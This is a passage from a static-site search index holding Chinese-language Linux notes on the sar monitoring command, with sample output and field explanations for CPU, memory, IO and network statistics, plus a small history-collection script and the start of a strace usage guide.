]","title":"sar\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#_1","text":"","title":"\u4e00\u4e9b\u5e38\u7528\u7684\u5177\u4f53\u89e3\u91ca"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#1cpu","text":"sar 1 3 \u6216 sar -u 1 3 $ sar 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:48:15 AM CPU %user %nice %system %iowait %steal %idle 12:48:16 AM all 0.00 0.00 0.25 0.00 0.00 99.75 12:48:17 AM all 0.00 0.00 0.00 0.00 0.00 100.00 12:48:18 AM all 0.00 0.00 0.25 0.25 0.00 99.50 Average: all 0.00 0.00 0.17 0.08 0.00 99.75 %user \u7528\u6237\u7a7a\u95f4\u7684CPU\u4f7f\u7528 %nice \u6539\u53d8\u8fc7\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u7684CPU\u4f7f\u7528\u7387 %system \u5185\u6838\u7a7a\u95f4\u7684CPU\u4f7f\u7528\u7387 %iowait CPU\u7b49\u5f85IO\u7684\u767e\u5206\u6bd4 %steal \u865a\u62df\u673a\u7684\u865a\u62df\u673aCPU\u4f7f\u7528\u7684CPU %idle \u7a7a\u95f2\u7684CPU","title":"1.\u67e5\u770bCPU\u4f7f\u7528\u60c5\u51b5"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#2","text":"sar -q 1 3 $ sar -q 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:52:45 AM runq-sz plist-sz ldavg-1 ldavg-5 ldavg-15 blocked 12:52:46 AM 0 233 0.00 0.01 0.05 0 12:52:47 AM 0 233 0.00 0.01 0.05 0 12:52:48 AM 0 233 0.00 0.01 0.05 0 Average: 0 233 0.00 0.01 0.05 0 runq-sz R\u72b6\u6001\u7684\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u6570 plist-sz \u8fdb\u7a0b\u5217\u8868\u4e2d\u7684\u8fdb\u7a0b\uff08processes\uff09\u548c\u7ebf\u7a0b\u6570\uff08threads\uff09\u7684\u6570\u91cf ldavg-1 \u6700\u540e1\u5206\u949f\u7684CPU\u5e73\u5747\u8d1f\u8f7d\uff0c\u5373\u5c06\u591a\u6838CPU\u8fc7\u53bb\u4e00\u5206\u949f\u7684\u8d1f\u8f7d\u76f8\u52a0\u518d\u9664\u4ee5\u6838\u5fc3\u6570\u5f97\u51fa\u7684\u5e73\u5747\u503c\uff0c5\u5206\u949f\u548c15\u5206\u949f\u4ee5\u6b64\u7c7b\u63a8 ldavg-5 \u6700\u540e5\u5206\u949f\u7684CPU\u5e73\u5747\u8d1f\u8f7d ldavg-15 \u6700\u540e15\u5206\u949f\u7684CPU\u5e73\u5747\u8d1f\u8f7d blocked \u56e0IO\u4e0d\u53ef\u4e2d\u65ad\u7684\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u6570","title":"2.\u67e5\u770b\u5e73\u5747\u8d1f\u8f7d"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#3","text":"sar -r 1 3 $ sar -r 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:55:29 AM kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 12:55:30 AM 4646840 3361792 41.98 296276 2403396 2122468 26.50 1791748 1167196 228 12:55:31 AM 4646840 3361792 41.98 296276 2403396 2122468 26.50 1791752 1167196 228 12:55:32 AM 4646840 3361792 41.98 296276 2403396 2122468 26.50 1791752 1167196 232 Average: 4646840 3361792 41.98 296276 2403396 2122468 26.50 1791751 1167196 229 kbmemfree \u7a7a\u95f2\u7684\u7269\u7406\u5185\u5b58\u5927\u5c0f kbmemused \u4f7f\u7528\u4e2d\u7684\u7269\u7406\u5185\u5b58\u5927\u5c0f %memused \u7269\u7406\u5185\u5b58\u4f7f\u7528\u7387 kbbuffers \u5185\u6838\u4e2d\u4f5c\u4e3a\u7f13\u51b2\u533a\u4f7f\u7528\u7684\u7269\u7406\u5185\u5b58\u5927\u5c0f\uff0ckbbuffers\u548ckbcached:\u8fd9\u4e24\u4e2a\u503c\u5c31\u662ffree\u547d\u4ee4\u4e2d\u7684buffer\u548ccache. kbcached \u7f13\u5b58\u7684\u6587\u4ef6\u5927\u5c0f kbcommit \u5f53\u524d\u5de5\u4f5c\u8d1f\u8f7d\u6240\u9700\u7684\u5185\u5b58\u91cf\uff08KB\uff09\u3002\u8fd9\u662f\u4e00\u4e2a\u4f30\u8ba1\u9700\u8981\u591a\u5c11RAM\u548cswap\u6765\u4fdd\u8bc1\u6c38\u8fdc\u4e0d\u4f1a\u51fa\u73b0\u5185\u5b58\u4e0d\u8db3\u7684\u60c5\u51b5 commit \u5f53\u524d\u5de5\u4f5c\u8d1f\u8f7d\u6240\u9700\u5185\u5b58\u5360\u5185\u5b58\u603b\u91cf\uff08RAM+\u4ea4\u6362\uff09\u7684\u767e\u5206\u6bd4\u3002\u8fd9\u4e2a\u6570\u5b57\u53ef\u80fd\u5927\u4e8e100%\u3002 \u5c31\u662fkbcommit\u9664\u4ee5(\u5f53\u524d\u7684\u7269\u7406\u5185\u5b58+swap\u603b\u91cf) \u4f4e\u4e8e100%\u8bf4\u660e\u5185\u5b58\u65e0\u538b\u529b\uff0c\u9ad8\u4e8e100%\uff0c\u8bf4\u660e\u5185\u5b58\u4e0d\u591f\uff0c\u9700\u8981\u5347\u914d\u7f6e kbactive\uff0c\u8868\u793a\u6d3b\u8dc3\u5185\u5b58\uff0c\u4e5f\u5c31\u662f\u6700\u8fd1\u4f7f\u7528\u8fc7\u7684\u5185\u5b58\uff0c\u4e00\u822c\u4e0d\u4f1a\u88ab\u7cfb\u7edf\u56de\u6536\u3002 kbinact\uff0c\u8868\u793a\u975e\u6d3b\u8dc3\u5185\u5b58\uff0c\u4e5f\u5c31\u662f\u4e0d\u5e38\u8bbf\u95ee\u7684\u5185\u5b58\uff0c\u6709\u53ef\u80fd\u4f1a\u88ab\u7cfb\u7edf\u56de\u6536\u3002","title":"3.\u67e5\u770b\u5185\u5b58\u4f7f\u7528\u60c5\u51b5"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#4swap","text":"sar -W 1 3 [root@VM-0-16-centos ~]# sar -W 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:59:47 AM pswpin/s pswpout/s 12:59:48 AM 0.00 0.00 12:59:49 AM 0.00 0.00 12:59:50 AM 0.00 0.00 Average: 0.00 0.00 pswpin/s \u6bcf\u79d2\u4ece\u4ea4\u6362\u5206\u533a\u5230\u7cfb\u7edf\u7684\u4ea4\u6362\u9875\u9762\uff08swap page\uff09\u6570\u91cf pswpott/s \u6bcf\u79d2\u4ece\u7cfb\u7edf\u4ea4\u6362\u5230swap\u7684\u4ea4\u6362\u9875\u9762\uff08swap page\uff09\u7684\u6570\u91cf sar -B $ sar -B 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:00:44 AM pgpgin/s pgpgout/s fault/s majflt/s pgfree/s pgscank/s pgscand/s pgsteal/s %vmeff 01:00:45 AM 0.00 0.00 29.00 0.00 72.00 0.00 0.00 0.00 0.00 01:00:46 AM 0.00 0.00 28.00 0.00 28.00 0.00 0.00 0.00 0.00 01:00:47 AM 0.00 0.00 18.00 0.00 25.00 0.00 0.00 0.00 0.00 Average: 0.00 0.00 25.00 0.00 41.67 0.00 0.00 0.00 0.00 pgpgin/s \uff1a\u7cfb\u7edf\u6bcf\u79d2\u4ece\u78c1\u76d8\u8c03\u5165\u7684\u603bKB\u6570\u3002 pgpgout/s \uff1a\u7cfb\u7edf\u6bcf\u79d2\u5206\u9875\u5230\u78c1\u76d8\u7684\u603bKB\u6570\u3002 fault/s\uff1a\u7cfb\u7edf\u6bcf\u79d2\u4ea7\u751f\u7684\u9875\u9762\u5931\u6548(major + minor)\u6570\u91cf majflt/s\uff1a\u7cfb\u7edf\u6bcf\u79d2\u4ea7\u751f\u7684\u9875\u9762\u5931\u6548(major)\u6570\u91cf pgscank/s\uff1a\u6bcf\u79d2\u88abkswapd\u626b\u63cf\u7684\u9875\u4e2a\u6570 pgscand/s\uff1a\u6bcf\u79d2\u76f4\u63a5\u88ab\u626b\u63cf\u7684\u9875\u4e2a\u6570 %vmeff\uff1a\u6bcf\u79d2\u6e05\u9664\u7684\u9875(pgsteal)\u5360\u603b\u626b\u63cf\u9875(pgscank + pgscand)\u7684\u767e\u5206\u6bd4","title":"4.\u67e5\u770b\u7cfb\u7edfswap\u5206\u533a\u7edf\u8ba1\u60c5\u51b5"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#5io","text":"sar -b 1 3 $ sar -b 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:17:46 AM tps rtps wtps bread/s bwrtn/s 01:17:47 AM 0.00 0.00 0.00 0.00 0.00 01:17:48 AM 2.00 0.00 2.00 0.00 24.00 01:17:49 AM 0.00 0.00 0.00 0.00 0.00 Average: 0.67 0.00 0.67 0.00 8.00 tps \u78c1\u76d8\u6bcf\u79d2\u949f\u7684IO\u603b\u6570\uff0c\u7b49\u4e8eiostat\u4e2d\u7684tps rtps \u6bcf\u79d2\u949f\u4ece\u78c1\u76d8\u8bfb\u53d6\u7684IO\u603b\u6570 wtps \u6bcf\u79d2\u949f\u4ece\u5199\u5165\u5230\u78c1\u76d8\u7684IO\u603b\u6570 bread/s \u6bcf\u79d2\u949f\u4ece\u78c1\u76d8\u8bfb\u53d6\u7684\u5757\u603b\u6570 bwrtn/s \u6bcf\u79d2\u949f\u6b64\u5199\u5165\u5230\u78c1\u76d8\u7684\u5757\u603b\u6570","title":"5.\u67e5\u770bIO\u548c\u4f20\u9012\u901f\u7387"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#6","text":"sar -d $ sar -d -p 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:20:54 AM DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 01:20:55 AM vda 2.00 0.00 24.00 12.00 0.00 1.00 1.50 0.30 01:20:55 AM vdb 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:20:55 AM sr0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util Average: vda 2.00 0.00 24.00 12.00 0.00 1.00 1.50 0.30 Average: vdb 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: sr0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 DEV \u78c1\u76d8\u8bbe\u5907\u7684\u540d\u79f0\uff0c\u5982\u679c\u4e0d\u52a0-p\uff0c\u4f1a\u663e\u793adev253-0\u7c7b\u4f3c\u7684\u8bbe\u5907\u540d\u79f0\uff0c\u56e0\u6b64\u52a0\u4e0a-p\u663e\u793a\u7684\u540d\u79f0\u66f4\u76f4\u63a5 tps \u6bcf\u79d2I/O\u7684\u4f20\u8f93\u603b\u6570 rd_sec/s \u6bcf\u79d2\u8bfb\u53d6\u7684\u6247\u533a\u7684\u603b\u6570 wr_sec/s \u6bcf\u79d2\u5199\u5165\u7684\u6247\u533a\u7684\u603b\u6570 avgrq-sz \u5e73\u5747\u6bcf\u6b21\u6b21\u78c1\u76d8I/O\u64cd\u4f5c\u7684\u6570\u636e\u5927\u5c0f\uff08\u6247\u533a\uff09 avgqu-sz \u78c1\u76d8\u8bf7\u6c42\u961f\u5217\u7684\u5e73\u5747\u957f\u5ea6 await \u4ece\u8bf7\u6c42\u78c1\u76d8\u64cd\u4f5c\u5230\u7cfb\u7edf\u5b8c\u6210\u5904\u7406\uff0c\u6bcf\u6b21\u8bf7\u6c42\u7684\u5e73\u5747\u6d88\u8017\u65f6\u95f4\uff0c\u5305\u62ec\u8bf7\u6c42\u961f\u5217\u7b49\u5f85\u65f6\u95f4\uff0c\u5355\u4f4d\u662f\u6beb\u79d2\uff081\u79d2\u7b49\u4e8e1000\u6beb\u79d2\uff09\uff0c\u7b49\u4e8e\u5bfb\u9053\u65f6\u95f4+\u961f\u5217\u65f6\u95f4+\u670d\u52a1\u65f6\u95f4 svctm I/O\u7684\u670d\u52a1\u5904\u7406\u65f6\u95f4\uff0c\u5373\u4e0d\u5305\u62ec\u8bf7\u6c42\u961f\u5217\u4e2d\u7684\u65f6\u95f4 %util I/O\u8bf7\u6c42\u5360\u7528\u7684CPU\u767e\u5206\u6bd4\uff0c\u503c\u8d8a\u9ad8\uff0c\u8bf4\u660eI/O\u8d8a\u6162","title":"6.\u67e5\u770b\u78c1\u76d8\u4f7f\u7528\u60c5\u51b5"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#7","text":"sar -n DEV 1 1 $ sar -n DEV 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:23:50 AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s 01:23:51 AM veth664db5a 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:23:51 AM eth0 3.00 1.00 0.17 0.21 0.00 0.00 0.00 01:23:51 AM lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:23:51 AM br-be5dce24fae2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:23:51 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s Average: veth664db5a 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: eth0 3.00 1.00 0.17 0.21 0.00 0.00 0.00 Average: lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: br-be5dce24fae2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 IFACE \u672c\u5730\u7f51\u5361\u63a5\u53e3\u7684\u540d\u79f0 rxpck/s \u6bcf\u79d2\u949f\u63a5\u53d7\u7684\u6570\u636e\u5305 txpck/s \u6bcf\u79d2\u949f\u53d1\u9001\u7684\u6570\u636e\u5e93 rxKB/S \u6bcf\u79d2\u949f\u63a5\u53d7\u7684\u6570\u636e\u5305\u5927\u5c0f\uff0c\u5355\u4f4d\u4e3aKB txKB/S \u6bcf\u79d2\u949f\u53d1\u9001\u7684\u6570\u636e\u5305\u5927\u5c0f\uff0c\u5355\u4f4d\u4e3aKB rxcmp/s \u6bcf\u79d2\u949f\u63a5\u53d7\u7684\u538b\u7f29\u6570\u636e\u5305 txcmp/s \u6bcf\u79d2\u949f\u53d1\u9001\u7684\u538b\u7f29\u5305 rxmcst/s \u6bcf\u79d2\u949f\u63a5\u6536\u7684\u591a\u64ad\u6570\u636e\u5305 \u7f51\u7edc\u8bbe\u5907\u901a\u4fe1\u5931\u8d25\u4fe1\u606f sar -n EDEV 1 1 $ sar -n EDEV 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:24:56 AM IFACE rxerr/s txerr/s coll/s rxdrop/s txdrop/s txcarr/s rxfram/s rxfifo/s txfifo/s 01:24:57 AM veth664db5a 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:24:57 AM eth0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:24:57 AM lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:24:57 AM br-be5dce24fae2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:24:57 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: IFACE rxerr/s txerr/s coll/s rxdrop/s txdrop/s txcarr/s rxfram/s rxfifo/s txfifo/s Average: veth664db5a 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: eth0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: br-be5dce24fae2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 IFACE \u7f51\u5361\u540d\u79f0 rxerr/s \u6bcf\u79d2\u949f\u63a5\u6536\u5230\u7684\u635f\u574f\u7684\u6570\u636e\u5305 txerr/s \u6bcf\u79d2\u949f\u53d1\u9001\u7684\u6570\u636e\u5305\u9519\u8bef\u6570 coll/s \u5f53\u53d1\u9001\u6570\u636e\u5305\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u53d1\u751f\u7684\u51b2\u649e\uff08collisions\uff09\u6570\uff0c\u8fd9\u4e2a\u662f\u5728\u534a\u53cc\u5de5\u6a21\u5f0f\u4e0b\u624d\u6709 rxdrop/s \u5f53\u7531\u4e8e\u7f13\u51b2\u533a\u6ee1\u7684\u65f6\u5019\uff0c\u7f51\u5361\u8bbe\u5907\u63a5\u6536\u7aef\u6bcf\u79d2\u949f\u4e22\u6389\u7684\u7f51\u7edc\u5305\u7684\u6570\u76ee txdrop/s \u5f53\u7531\u4e8e\u7f13\u51b2\u533a\u6ee1\u7684\u65f6\u5019\uff0c\u7f51\u7edc\u8bbe\u5907\u53d1\u9001\u7aef\u6bcf\u79d2\u949f\u4e22\u6389\u7684\u7f51\u7edc\u5305\u7684\u6570\u76ee txcarr/s \u5f53\u53d1\u9001\u6570\u636e\u5305\u7684\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u8f7d\u6ce2\u9519\u8bef\u53d1\u751f\u7684\u6b21\u6570 rxfram/s \u5728\u63a5\u6536\u6570\u636e\u5305\u7684\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u53d1\u751f\u7684\u5e27\u5bf9\u5176\u9519\u8bef\u7684\u6b21\u6570 rxfifo/s \u5728\u63a5\u6536\u6570\u636e\u5305\u7684\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u9519\u8bef\u53d1\u751f\u7684\u6b21\u6570 txfifo/s \u5728\u53d1\u751f\u6570\u636e\u5305 \u7684\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u9519\u8bef\u53d1\u751f\u7684\u6b21\u6570 \u7edf\u8ba1socket\u8fde\u63a5\u4fe1\u606f sar -n SOCK 1 1 $ sar -n SOCK Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:00:01 AM totsck tcpsck udpsck rawsck ip-frag tcp-tw 12:10:01 AM 266 6 3 0 0 0 12:20:01 AM 265 5 3 0 0 0 12:30:01 AM 265 5 3 0 0 0 12:40:01 AM 267 6 3 0 0 0 12:50:01 AM 268 7 3 0 0 0 01:00:01 AM 267 6 3 0 0 1 01:10:01 AM 267 6 3 0 0 0 01:20:01 AM 267 6 3 0 0 0 01:30:01 AM 267 6 3 0 0 0 Average: 267 6 3 0 0 0 totsck \u5f53\u524d\u88ab\u4f7f\u7528\u7684socket\u603b\u6570 tcpsck \u5f53\u524d\u6b63\u5728\u88ab\u4f7f\u7528\u7684TCP\u7684socket\u603b\u6570 udpsck \u5f53\u524d\u6b63\u5728\u88ab\u4f7f\u7528\u7684UDP\u7684socket\u603b\u6570 rawsck \u5f53\u524d\u6b63\u5728\u88ab\u4f7f\u7528\u4e8eRAW\u7684skcket\u603b\u6570 if-frag \u5f53\u524d\u7684IP\u5206\u7247\u7684\u6570\u76ee tcp-tw TCP\u5957\u63a5\u5b57\u4e2d\u5904\u4e8eTIME-WAIT\u72b6\u6001\u7684\u8fde\u63a5\u6570\u91cf","title":"7.\u7f51\u7edc\u63a5\u53e3\u4fe1\u606f"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#8tcp","text":"sar -n TCP 1 1 $ sar -n TCP 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:38:36 AM active/s passive/s iseg/s oseg/s 01:38:37 AM 0.00 0.00 2.00 1.00 Average: 0.00 0.00 2.00 1.00 active/s \u65b0\u7684\u4e3b\u52a8\u8fde\u63a5 passive/s \u65b0\u7684\u88ab\u52a8\u8fde\u63a5 iseg/s \u63a5\u53d7\u7684\u6bb5 oseg/s \u8f93\u51fa\u7684\u6bb5","title":"8.TCP\u8fde\u63a5\u7684\u7edf\u8ba1"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#_2","text":"\u9ed8\u8ba4\u76d1\u63a7: sar 1 1 CPU\u548cIOWAIT\u7edf\u8ba1\u72b6\u6001 sar -b 1 1 IO\u4f20\u9001\u901f\u7387 sar -B 1 1 \u9875\u4ea4\u6362\u901f\u7387 sar -c 1 1 \u8fdb\u7a0b\u521b\u5efa\u7684\u901f\u7387 sar -d 1 1 \u5757\u8bbe\u5907\u7684\u6d3b\u8dc3\u4fe1\u606f sar -n DEV 1 1 \u7f51\u8def\u8bbe\u5907\u7684\u72b6\u6001\u4fe1\u606f sar -n EDVE 1 1 \u7f51\u7edc\u8bbe\u5907\u901a\u4fe1\u5931\u8d25\u4fe1\u606f sar -n SOCK 1 1 SOCK\u7684\u4f7f\u7528\u60c5\u51b5 sar -n TCP TCP\u8fde\u63a5\u7684\u7edf\u8ba1 sar -n ALL 1 1 \u6240\u6709\u7684\u7f51\u7edc\u72b6\u6001\u4fe1\u606f sar -P ALL 1 1 \u6bcf\u9897CPU\u7684\u4f7f\u7528\u72b6\u6001\u4fe1\u606f\u548cIOWAIT\u7edf\u8ba1\u72b6\u6001 sar -q 1 1 \u961f\u5217\u7684\u957f\u5ea6\uff08\u7b49\u5f85\u8fd0\u884c\u7684\u8fdb\u7a0b\u6570\uff09\u548c\u8d1f\u8f7d\u7684\u72b6\u6001 sar -r 1 1 \u5185\u5b58\u548cswap\u7a7a\u95f4\u4f7f\u7528\u60c5\u51b5 sar -R 1 1 \u5185\u5b58\u7684\u7edf\u8ba1\u4fe1\u606f\uff08\u5185\u5b58\u9875\u7684\u5206\u914d\u548c\u91ca\u653e\u3001\u7cfb\u7edf\u6bcf\u79d2\u4f5c\u4e3aBUFFER\u4f7f\u7528\u5185\u5b58\u9875\u3001\u6bcf\u79d2\u88abcache\u5230\u7684\u5185\u5b58\u9875\uff09 sar -u 1 1 CPU\u7684\u4f7f\u7528\u60c5\u51b5\u548cIOWAIT\u4fe1\u606f\uff08\u540c\u9ed8\u8ba4\u76d1\u63a7\uff09 sar -v 1 1 inode, file and other kernel tablesd\u7684\u72b6\u6001\u4fe1\u606f sar -w 1 1 \u6bcf\u79d2\u4e0a\u4e0b\u6587\u4ea4\u6362\u7684\u6570\u76ee sar -W 1 1 SWAP\u4ea4\u6362\u7684\u7edf\u8ba1\u4fe1\u606f(\u76d1\u63a7\u72b6\u6001\u540ciostat \u7684si so) sar -x 2906 1 1 \u663e\u793a\u6307\u5b9a\u8fdb\u7a0b(2906)\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u4fe1\u606f\u5305\u62ec\uff1a\u8fdb\u7a0b\u9020\u6210\u7684\u9519\u8bef\u3001\u7528\u6237\u7ea7\u548c\u7cfb\u7edf\u7ea7\u7528\u6237CPU\u7684\u5360\u7528\u60c5\u51b5\u3001\u8fd0\u884c\u5728\u54ea\u9897CPU\u4e0a sar -y 1 1 TTY\u8bbe\u5907\u7684\u6d3b\u52a8\u72b6\u6001","title":"\u5e38\u7528\u96c6\u5408"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#sarman","text":"sar(1) - Linux manual page (man7.org)","title":"sar\u7684man\u624b\u518c\uff1a"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#sarsar","text":"\u7cfb\u7edf\u7edf\u8ba1\u5c40 (pagesperso-orange.fr)","title":"sar\u5b98\u7f51\uff08\u4e0a\u9762\u6709sar\u7684\u5177\u4f53\u89e3\u91ca\uff09\uff1a"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#sar_1","text":"\u67e5\u627e\u6700\u8fd1\u4e00\u5929\u7684sar\u5386\u53f2\u5728\u4fdd\u5b58 sar_history() { if [ ! -d '/var/log/sa' ];then echo \"sar\u6570\u636e\u76ee\u5f55\u672a\u627e\u5230\" fi sa_file=$(find /var/log/sa/* -ctime -1 -name \"sa*\" ! -name \"sar*\") for i in ${sa_file};do sar -p -A -f ${i} >> sar_history_data.txt done } sar_history &","title":"\u4e00\u6bb5\u67e5\u8be2sar\u5386\u53f2\u8bb0\u5f55\u7684\u811a\u672c\uff1a"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/strace/","text":"strace\u547d\u4ee4 strace\u6709\u4e24\u79cd\u8fd0\u884c\u6a21\u5f0f \u65b9\u5f0f\u4e00 \u901a\u8fc7\u5b83\u542f\u52a8\u8981\u8ddf\u8e2a\u7684\u8fdb\u7a0b\uff0c\u5728\u539f\u672c\u7684\u547d\u4ee4\u524d\u52a0\u4e0astrace\u5373\u53ef\u3002\u6bd4\u5982\u8981\u8ddf\u8e2a ls -lh /var/log/messages \u8fd9\u4e2a\u547d\u4ee4\u7684\u6267\u884c\uff0c\u53ef\u4ee5\u8fd9\u6837\uff1a strace ls -lh /var/log/messages \u65b9\u5f0f\u4e8c \u8ddf\u8e2a\u5df2\u7ecf\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c-p pid \u9009\u9879\u5373\u53ef\uff0c\u6bd4\u5982\uff0c\u6709\u4e2a\u5728\u8fd0\u884c\u7684some_server\u670d\u52a1\uff0c\u67e5\u770bpid\uff0c\u7136\u540e\u8ddf\u8e2a pidof some_server 17553 strace -p 17553 \u6309ctrl + C \u7ed3\u675fstrace\u5373\u53ef strace\u6709\u4e00\u4e9b\u9009\u9879\u53ef\u4ee5\u8c03\u6574\u5176\u884c\u4e3a\uff0c\u6211\u4eec\u8fd9\u91cc\u4ecb\u7ecd\u4e0b\u5176\u4e2d\u51e0\u4e2a\u6bd4\u8f83\u5e38\u7528\u7684\uff0c\u7136\u540e\u901a\u8fc7\u793a\u4f8b\u8bb2\u89e3\u5176\u5b9e\u9645\u5e94\u7528\u6548\u679c\u3002 \u793a\u4f8b\u547d\u4ee4\uff1a strace -tt -T -v -f -e trace=file -o /data/log/strace.log -s 1024 -p 23489 \u67e5\u770b\u8fdb\u7a0b\u8c03\u7528\u4e86\u54ea\u4e9b\u6587\u4ef6 -tt \u5728\u6bcf\u884c\u8f93\u51fa\u7684\u524d\u9762\uff0c\u663e\u793a\u6beb\u79d2\u7ea7\u522b\u7684\u65f6\u95f4 -T \u663e\u793a\u6bcf\u6b21\u7cfb\u7edf\u8c03\u7528\u6240\u82b1\u8d39\u7684\u65f6\u95f4 -v \u5bf9\u4e8e\u67d0\u4e9b\u76f8\u5173\u8c03\u7528\uff0c\u628a\u5b8c\u6574\u7684\u73af\u5883\u53d8\u91cf\uff0c\u6587\u4ef6stat\u7ed3\u6784\u7b49\u6253\u51fa\u6765\u3002 -f \u8ddf\u8e2a\u76ee\u6807\u8fdb\u7a0b\uff0c\u4ee5\u53ca\u76ee\u6807\u8fdb\u7a0b\u521b\u5efa\u7684\u6240\u6709\u5b50\u8fdb\u7a0b -e \u63a7\u5236\u8981\u8ddf\u8e2a\u7684\u4e8b\u4ef6\u548c\u8ddf\u8e2a\u884c\u4e3a,\u6bd4\u5982\u6307\u5b9a\u8981\u8ddf\u8e2a\u7684\u7cfb\u7edf\u8c03\u7528\u540d\u79f0 -o \u628astrace\u7684\u8f93\u51fa\u5355\u72ec\u5199\u5230\u6307\u5b9a\u7684\u6587\u4ef6 -s \u5f53\u7cfb\u7edf\u8c03\u7528\u7684\u67d0\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u65f6\uff0c\u6700\u591a\u8f93\u51fa\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u9ed8\u8ba4\u662f32\u4e2a\u5b57\u8282 -p \u6307\u5b9a\u8981\u8ddf\u8e2a\u7684\u8fdb\u7a0bpid, \u8981\u540c\u65f6\u8ddf\u8e2a\u591a\u4e2apid, \u91cd\u590d\u591a\u6b21-p\u9009\u9879\u5373\u53ef\u3002 \u8ddf\u8e2anginx, \u770b\u5176\u542f\u52a8\u65f6\u90fd\u8bbf\u95ee\u4e86\u54ea\u4e9b\u6587\u4ef6 strace -tt -T -f -e trace=file -o /data/log/strace.log -s 1024 ./nginx \u4e0d\u6307\u5b9a\u8bb0\u5f55\u7c7b\u578b strace -tt -T -f -o /tmp/strace.log -s 1024 -p \u8fdb\u7a0b\u53f7 \u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u67e5\u8be2 https://man7.org/linux/man-pages/man2/syscalls.2.html strace\u53c2\u6570 -c \u7edf\u8ba1\u6bcf\u4e00\u7cfb\u7edf\u8c03\u7528\u7684\u6240\u6267\u884c\u7684\u65f6\u95f4,\u6b21\u6570\u548c\u51fa\u9519\u7684\u6b21\u6570\u7b49. -d \u8f93\u51fastrace\u5173\u4e8e\u6807\u51c6\u9519\u8bef\u7684\u8c03\u8bd5\u4fe1\u606f. -f 